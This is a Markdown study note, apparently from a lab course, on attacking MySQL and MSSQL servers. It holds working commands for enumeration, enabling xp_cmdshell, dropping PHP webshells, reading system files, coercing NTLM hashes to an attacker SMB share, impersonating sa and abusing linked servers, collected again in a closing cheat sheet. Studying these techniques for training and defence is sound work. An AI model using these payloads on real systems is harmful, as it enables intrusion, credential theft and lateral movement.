@@ -1,0 +1,1095 @@
+# Attacking Common Services - Attacking SQL
+
+## Overview
+
+**MySQL** and **Microsoft SQL Server (MSSQL)** are relational database management systems that store data in:
+
+- tables
+- columns
+- rows
+
+They commonly use **Structured Query Language (SQL)** for querying, updating, and maintaining data.
+
+Database servers are high-value targets because they often store:
+
+- user credentials
+- personal identifiable information (PII)
+- business data
+- payment data
+- configuration secrets
+- tokens
+- operational metadata
+
+They also frequently run with **highly privileged service accounts**, which means database access can sometimes lead to:
+
+- command execution
+- lateral movement
+- privilege escalation
+- file read/write
+- credential capture
+- impersonation of other users
+
+---
+
+# Enumeration
+
+## Common Default Ports
+
+### MSSQL
+- **TCP 1433**
+- **UDP 1434**
+- sometimes **TCP 2433** when operating in a hidden mode
+
+### MySQL
+- **TCP 3306**
+
+---
+
+## Nmap Enumeration
+
+A quick initial scan can be done with:
+
+```bash
+nmap -Pn -sV -sC -p1433 10.10.10.125
+```
+
+### Example Output
+
+```text
+Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
+Nmap scan report for 10.10.10.125
+Host is up (0.0099s latency).
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: mssql-test
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: mssql-test.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2021-08-26T01:04:36
+|_Not valid after:  2051-08-26T01:04:36
+|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.
+
+Host script results:
+|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+```
+
+### What this tells you
+
+This reveals useful information such as:
+
+- database engine
+- version
+- host naming
+- domain naming
+- certificate details
+- likely OS version
+
+### Why this matters
+
+Version and host metadata can help you:
+
+- identify common misconfigurations
+- search for known vulnerabilities
+- distinguish Windows-integrated authentication environments
+- map domain naming conventions
+- identify whether SQL Server is domain-joined
+
+---
+
+# Authentication Mechanisms
+
+## MSSQL Authentication Modes
+
+MSSQL supports two authentication types:
+
+| Authentication Type | Description |
+|---|---|
+| Windows authentication mode | Integrated with Windows / Active Directory. Trusted Windows users and groups can log in. |
+| Mixed mode | Supports both Windows/AD accounts and SQL Server-local usernames/passwords. |
+
+### Why this matters
+
+The authentication mode affects:
+
+- how credentials are validated
+- whether domain accounts can be used
+- whether SQL-local accounts exist
+- what attack surface is exposed
+
+---
+
+## MySQL Authentication
+
+MySQL commonly uses:
+
+- username + password
+- plugin-based auth
+- sometimes Windows authentication via plugin
+
+### Why this matters
+
+Different authentication models can introduce:
+
+- weak local accounts
+- plugin misconfigurations
+- insecure trust assumptions
+- compatibility-related weaknesses
+
+---
+
+# Historical MySQL Authentication Bug
+
+## CVE-2012-2122
+
+Older MySQL 5.6.x versions suffered from a vulnerability where authentication could sometimes be bypassed by repeatedly using the same incorrect password.
+
+### Conceptually
+
+Because of flawed handling in authentication comparison logic, repeated attempts could eventually succeed when they should not.
+
+### Why it matters
+
+This is a good reminder that database authentication code itself can be vulnerable, not just the database configuration.
+
+---
+
+# Common Misconfigurations
+
+Misconfigured SQL services may expose access through:
+
+- anonymous access
+- weak passwords
+- blank passwords
+- over-permissive Windows group access
+- trust relationships
+- overprivileged service accounts
+- dangerous built-in stored procedures
+- linked servers using high-privilege accounts
+
+---
+
+# Potential Actions After Database Access
+
+Depending on privileges, you may be able to:
+
+- read data
+- modify data
+- change configuration
+- execute operating system commands
+- read local files
+- write local files
+- communicate with other databases
+- capture hashes
+- impersonate users
+- move laterally
+
+---
+
+# Protocol-Specific Attacks
+
+# Read / Change the Database
+
+Once authenticated, the first goal is usually to understand:
+
+- what databases exist
+- which one contains useful data
+- what tables exist
+- which columns may contain credentials, secrets, or operational information
+
+---
+
+## Connecting to MySQL
+
+```bash
+mysql -u julio -pPassword123 -h 10.129.20.13
+```
+
+### Example Output
+
+```text
+Welcome to the MariaDB monitor. Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+```
+
+---
+
+## Connecting to MSSQL with `sqlcmd`
+
+```bash
+sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+```
+
+### Why `-y` and `-Y` matter
+
+These parameters improve output formatting by widening type display limits. They make results easier to read, though they may affect performance.
+
+---
+
+## Connecting to MSSQL from Linux with `sqsh`
+
+```bash
+sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+```
+
+### Why `-h` matters
+
+In `sqsh`, `-h` suppresses headers and footers for cleaner results.
+
+---
+
+## Connecting to MSSQL with Impacket
+
+```bash
+mssqlclient.py -p 1433 julio@10.129.203.7
+```
+
+### Example Output
+
+```text
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
+[!] Press help for extra shell commands
+SQL>
+```
+
+### Why this is useful
+
+`mssqlclient.py` is often very handy during pentests because it is lightweight, scriptable, and commonly present on attack boxes with Impacket installed.
+
+---
+
+## Windows Authentication vs SQL Authentication
+
+If targeting MSSQL with Windows Authentication, specify the domain or hostname.
+
+Example with a local account:
+
+```bash
+sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
+```
+
+### Why this matters
+
+If you do **not** specify a domain or hostname, the client may assume SQL Authentication instead of Windows Authentication.
+
+---
+
+# Default System Databases
+
+## MySQL Default Databases
+
+| Database | Purpose |
+|---|---|
+| `mysql` | System database containing server-required tables |
+| `information_schema` | Metadata about databases, tables, columns, etc. |
+| `performance_schema` | Performance and execution monitoring |
+| `sys` | Friendly helper views built on performance schema |
+
+---
+
+## MSSQL Default Databases
+
+| Database | Purpose |
+|---|---|
+| `master` | Core instance metadata |
+| `msdb` | SQL Server Agent data |
+| `model` | Template for new databases |
+| `resource` | Read-only system objects |
+| `tempdb` | Temporary objects and query workspace |
+
+### Why these matter
+
+Even if they do not contain company business data, these databases are extremely useful for:
+
+- metadata discovery
+- privilege checks
+- linked server enumeration
+- user enumeration
+- server configuration discovery
+
+---
+
+# Basic SQL Syntax
+
+## Show Databases
+
+### MySQL
+
+```sql
+SHOW DATABASES;
+```
+
+### Example Output
+
+```text
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| htbusers           |
++--------------------+
+```
+
+### MSSQL
+
+```sql
+SELECT name FROM master.dbo.sysdatabases
+GO
+```
+
+### Example Output
+
+```text
+name
+--------------------------------------------------
+master
+tempdb
+model
+msdb
+htbusers
+```
+
+---
+
+## Select a Database
+
+### MySQL
+
+```sql
+USE htbusers;
+```
+
+### MSSQL
+
+```sql
+USE htbusers
+GO
+```
+
+---
+
+## Show Tables
+
+### MySQL
+
+```sql
+SHOW TABLES;
+```
+
+### MSSQL
+
+```sql
+SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+GO
+```
+
+---
+
+## Read Table Contents
+
+### MySQL
+
+```sql
+SELECT * FROM users;
+```
+
+### MSSQL
+
+```sql
+SELECT * FROM users
+GO
+```
+
+### Example Output
+
+```text
+id          username             password         data_of_joining
+----------- -------------------- ---------------- -----------------------
+1           admin                p@ssw0rd         2020-07-02 00:00:00.000
+2           administrator        adm1n_p@ss       2020-07-02 11:30:50.000
+3           john                 john123!         2020-07-02 11:47:16.000
+4           tom                  tom123!          2020-07-02 12:23:16.000
+```
+
+### What to look for
+
+When reviewing tables, prioritise fields such as:
+
+- `username`
+- `password`
+- `token`
+- `apikey`
+- `secret`
+- `email`
+- `role`
+- `session`
+- `config`
+- `credential`
+
+---
+
+# Execute Commands
+
+## MSSQL - `xp_cmdshell`
+
+One of the most powerful MSSQL attack primitives is `xp_cmdshell`, which allows OS command execution.
+
+### Example
+
+```sql
+xp_cmdshell 'whoami'
+GO
+```
+
+### Example Output
+
+```text
+output
+-----------------------------
+no service\mssql$sqlexpress
+NULL
+```
+
+### Important Notes About `xp_cmdshell`
+
+- disabled by default
+- extremely powerful
+- runs with the SQL Server service account’s privileges
+- synchronous, so the SQL client waits until the command finishes
+
+---
+
+## Enable `xp_cmdshell`
+
+If you have sufficient privileges:
+
+```sql
+EXECUTE sp_configure 'show advanced options', 1
+GO
+
+RECONFIGURE
+GO
+
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO
+
+RECONFIGURE
+GO
+```
+
+### Why this matters
+
+If the SQL service account is privileged, enabling `xp_cmdshell` can effectively turn database access into operating system access.
+
+---
+
+## Other MSSQL Command Execution Paths
+
+Other possible command execution routes include:
+
+- extended stored procedures
+- CLR assemblies
+- SQL Server Agent jobs
+- external scripts
+- registry abuse such as `xp_regwrite`
+
+These are out of scope here, but worth remembering if `xp_cmdshell` is unavailable.
+
+---
+
+## MySQL Command Execution
+
+MySQL does not provide a direct equivalent to `xp_cmdshell`.
+
+However, command execution may still be possible via:
+
+- user-defined functions (UDFs)
+- webshell file writes
+- abuse of application execution paths
+- abuse of local filesystem access
+
+---
+
+# Write Local Files
+
+# MySQL - Writing Files with `SELECT INTO OUTFILE`
+
+If permissions allow, MySQL can write arbitrary files.
+
+### Example PHP webshell drop
+
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+### Why this matters
+
+If the database is hosted on a web server and write access exists to a web-accessible directory, this can become command execution through the web application stack.
+
+---
+
+## MySQL `secure_file_priv`
+
+This global variable controls import/export file behaviour.
+
+### Check it
+
+```sql
+show variables like "secure_file_priv";
+```
+
+### Example Output
+
+```text
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+```
+
+### Meaning of possible values
+
+| Value | Meaning |
+|---|---|
+| empty | no restriction; insecure |
+| directory path | read/write limited to that directory |
+| `NULL` | file import/export disabled |
+
+### Why this matters
+
+If `secure_file_priv` is empty, file write and read operations become much more dangerous.
+
+---
+
+## MSSQL - Writing Files via OLE Automation Procedures
+
+If you have enough privileges, you can enable OLE Automation and write files.
+
+### Enable OLE Automation
+
+```sql
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+```
+
+### Create a file
+
+```sql
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+```
+
+### Why this matters
+
+This can be used to drop a webshell on IIS-backed servers.
+
+---
+
+# Read Local Files
+
+## MSSQL - `OPENROWSET(BULK...)`
+
+MSSQL often allows local file reads if the service account has access.
+
+```sql
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+GO
+```
+
+### Example Output
+
+```text
+BulkColumn
+-----------------------------------------------------------------------------
+# Copyright (c) 1993-2009 Microsoft Corp.
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+```
+
+### Why this matters
+
+This can expose:
+
+- config files
+- credentials
+- application source
+- keys
+- internal host mappings
+- service settings
+
+---
+
+## MySQL - `LOAD_FILE()`
+
+If settings and privileges allow:
+
+```sql
+select LOAD_FILE("/etc/passwd");
+```
+
+### Example Output
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+```
+
+### Why this matters
+
+Arbitrary file read from MySQL can expose:
+
+- `/etc/passwd`
+- web configs
+- application secrets
+- SSH keys
+- environment files
+- database creds reused elsewhere
+
+---
+
+# Capture MSSQL Service Hash
+
+## Using `xp_dirtree` or `xp_subdirs`
+
+Undocumented stored procedures such as `xp_dirtree` and `xp_subdirs` can be abused to coerce the SQL Server service account to authenticate to an attacker-controlled SMB server.
+
+### Example with `xp_dirtree`
+
+```sql
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+GO
+```
+
+### Example with `xp_subdirs`
+
+```sql
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+GO
+```
+
+### Why this works
+
+These procedures try to enumerate SMB paths. When the SQL Server reaches out to the remote share, it attempts SMB authentication and sends an NTLM challenge-response flow that can be captured.
+
+---
+
+## Capturing with Responder
+
+```bash
+sudo responder -I tun0
+```
+
+### What you get
+
+Responder may capture:
+
+- NetNTLMv2 hash of the SQL service account
+
+### Why this matters
+
+That captured hash may be:
+
+- cracked offline
+- relayed in some environments
+- used to identify privilege boundaries
+
+---
+
+## Capturing with Impacket SMB Server
+
+```bash
+sudo impacket-smbserver share ./ -smb2support
+```
+
+### Why this is useful
+
+This is another simple way to force and observe incoming SMB authentication attempts.
+
+---
+
+# Impersonate Existing Users with MSSQL
+
+## Overview
+
+MSSQL supports the `IMPERSONATE` permission, which allows one login to assume the rights of another.
+
+This can be a major privilege escalation path.
+
+---
+
+## Find Users You Can Impersonate
+
+```sql
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+```
+
+### Example Output
+
+```text
+name
+-----------------------------------------------
+sa
+ben
+valentin
+```
+
+---
+
+## Check Current User and Sysadmin Status
+
+```sql
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+
+### Example Output
+
+```text
+julio
+0
+```
+
+### Meaning
+
+- current user is `julio`
+- user is **not** sysadmin
+
+---
+
+## Impersonate a More Privileged User
+
+```sql
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+
+### Example Output
+
+```text
+sa
+1
+```
+
+### Why this matters
+
+If successful, you now operate as `sa`, which usually means full control of the SQL Server instance.
+
+---
+
+## Revert Back
+
+```sql
+REVERT
+```
+
+### Practical Note
+
+Run `EXECUTE AS LOGIN` from the `master` database when possible. If the impersonated account lacks access to your current database context, you may otherwise get errors.
+
+---
+
+# Linked Servers in MSSQL
+
+## Overview
+
+**Linked servers** allow one SQL Server instance to execute queries against another SQL Server or even another DBMS.
+
+If misconfigured, they can provide a path for:
+
+- lateral movement
+- remote command execution
+- privilege escalation into another server
+
+---
+
+## Enumerate Linked Servers
+
+```sql
+SELECT srvname, isremote FROM sysservers
+GO
+```
+
+### Example Output
+
+```text
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+```
+
+### Notes
+
+- `1` = remote server
+- `0` = linked server entry on the current instance
+
+---
+
+## Execute Queries on a Linked Server
+
+```sql
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+GO
+```
+
+### Example Output
+
+```text
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote 1
+```
+
+### What this tells you
+
+This reveals:
+
+- remote SQL instance name
+- remote SQL version
+- user used for linked auth
+- whether that user is sysadmin
+
+### Why this matters
+
+If the linked-server authentication uses a high-privilege account, you may be able to:
+
+- read remote data
+- enable `xp_cmdshell` remotely
+- execute system commands on the linked server
+- move laterally to another host
+
+---
+
+# Practical Attack Flow
+
+A practical SQL attack chain often looks like this:
+
+1. identify database type and version
+2. authenticate
+3. enumerate databases and tables
+4. search for secrets or credentials
+5. identify privilege level
+6. test command execution paths
+7. test local file read/write
+8. capture hashes where possible
+9. test impersonation
+10. enumerate linked servers for lateral movement
+
+Think of SQL access as getting into the control room, not just the filing cabinet. The data matters, but the configuration and trust paths often matter even more.
+
+---
+
+# Useful Commands Cheat Sheet
+
+## MSSQL Enumeration
+
+```sql
+SELECT name FROM master.dbo.sysdatabases
+GO
+```
+
+```sql
+SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES
+GO
+```
+
+```sql
+SELECT SYSTEM_USER
+GO
+```
+
+```sql
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+
+## MSSQL Command Execution
+
+```sql
+xp_cmdshell 'whoami'
+GO
+```
+
+```sql
+EXECUTE sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
+```
+
+## MSSQL File Read
+
+```sql
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+GO
+```
+
+## MSSQL Hash Capture
+
+```sql
+EXEC master..xp_dirtree '\\<attacker-ip>\share\'
+GO
+```
+
+```sql
+EXEC master..xp_subdirs '\\<attacker-ip>\share\'
+GO
+```
+
+## MSSQL Impersonation
+
+```sql
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+```
+
+```sql
+EXECUTE AS LOGIN = 'sa'
+GO
+```
+
+```sql
+REVERT
+GO
+```
+
+## MSSQL Linked Servers
+
+```sql
+SELECT srvname, isremote FROM sysservers
+GO
+```
+
+```sql
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<linked-server>]
+GO
+```
+
+## MySQL Enumeration
+
+```sql
+SHOW DATABASES;
+```
+
+```sql
+USE <database>;
+```
+
+```sql
+SHOW TABLES;
+```
+
+```sql
+SELECT * FROM <table>;
+```
+
+## MySQL File Read
+
+```sql
+select LOAD_FILE("/etc/passwd");
+```
+
+## MySQL File Write
+
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+## MySQL Secure File Priv
+
+```sql
+show variables like "secure_file_priv";
+```
+
+---
+
+# High-Value Findings
+
+The following are especially valuable during a SQL assessment:
+
+- plaintext credentials in tables
+- password reuse between app and service accounts
+- `xp_cmdshell` enabled
+- ability to enable dangerous procedures
+- file read from sensitive paths
+- file write into web roots
+- service account NTLM capture
+- impersonation of `sa`
+- linked servers using sysadmin credentials
+- ability to query remote databases
+- domain-integrated accounts with high privileges
+
+---
+
+# Key Takeaways
+
+- Databases are not just data stores; they are often privilege hubs.
+- Enumeration should focus on both **data** and **control**.
+- MSSQL offers many built-in post-auth attack primitives.
+- MySQL often becomes dangerous when file privileges are misconfigured.
+- Linked servers can quietly open lateral movement paths.
+- Service-account hash capture through UNC path abuse is a very useful technique.
+- Impersonation in MSSQL can turn a low-privilege foothold into full instance compromise.
+
+---
+
+# Tags
+
+#attacking-common-services  
+#sql  
+#mssql  
+#mysql  
+#database-attacks  
+#xp_cmdshell  
+#linked-servers  
+#sql-enumeration  
+#credential-hunting  
+#lateral-movement  
+#privilege-escalation  
+#obsidian
